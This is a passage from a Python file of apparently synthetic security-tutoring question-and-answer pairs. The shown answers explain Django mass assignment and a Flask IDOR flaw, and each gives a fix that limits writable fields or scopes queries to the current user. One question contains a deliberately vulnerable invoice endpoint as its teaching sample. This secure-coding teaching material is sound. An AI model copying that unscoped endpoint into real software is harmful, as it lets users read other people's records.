**Mass assignment.** `fields = '__all__'` includes `is_staff` and `is_superuser` in the serializer. The PATCH endpoint blindly writes all submitted fields to the model.

## Fix: Explicit Field Allowlist

```python
class UserProfileSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ['id', 'name', 'email', 'avatar', 'bio']  # Only safe fields
        read_only_fields = ['id']  # Even among allowed fields, some are read-only

class UserProfileView(generics.UpdateAPIView):
    serializer_class = UserProfileSerializer

    def get_object(self):
        return self.request.user
```

**Rules:**
1. **Never use `fields = '__all__'`** on writable serializers — explicitly list each field
2. **Mark sensitive fields `read_only`** if they must be in the response but not writable
3. **Separate serializers** for read vs write if needed (e.g., admins see more fields)
4. The attacker's `is_staff` and `is_superuser` keys are now silently ignored because they're not in the serializer's `fields`'''
    ),
    (
        "thinking/security-insecure-direct-object-reference",
        "Users can view their invoices at `/api/invoices/123`. An attacker changed the ID to view other users' invoices:\n\n```python\n@app.route('/api/invoices/<int:invoice_id>')\n@login_required\ndef get_invoice(invoice_id):\n    invoice = Invoice.query.get_or_404(invoice_id)\n    return jsonify(invoice.to_dict())\n```\n\nThe code checks authentication (login_required) but not authorization.",
        r'''<think>
Insecure Direct Object Reference (IDOR). The endpoint verifies the user is logged in but doesn't verify they own the requested invoice. Any authenticated user can access any invoice by guessing/iterating IDs.
</think>

**Insecure Direct Object Reference (IDOR).** The endpoint verifies authentication (is the user logged in?) but not authorization (does this user own this invoice?).

Any logged-in user can access any invoice by changing the ID: `/api/invoices/1`, `/api/invoices/2`, etc.

## Fix: Scope Queries to the Current User

```python
@app.route('/api/invoices/<int:invoice_id>')
@login_required
def get_invoice(invoice_id):
    # Query scoped to current user — can only access their own invoices
    invoice = Invoice.query.filter_by(
        id=invoice_id,
        user_id=current_user.id
    ).first_or_404()
    return jsonify(invoice.to_dict())
```

**For admin access to any invoice:**
```python
@app.route('/api/invoices/<int:invoice_id>')
@login_required
def get_invoice(invoice_id):
    invoice = Invoice.query.get_or_404(invoice_id)

    if invoice.user_id != current_user.id and not current_user.is_admin:
        abort(403)

    return jsonify(invoice.to_dict())
```

**The pattern:** Every data access query should include the user scope. "Can this user access this specific resource?" must be checked on every request, not just "is a user logged in?"'''
    ),
]

if __name__ == "__main__":
    for tag, q, a in PAIRS:
        print(f"  [{tag}] {q[:60]}...")
    print(f"\nTotal pairs in this file: {len(PAIRS)}")
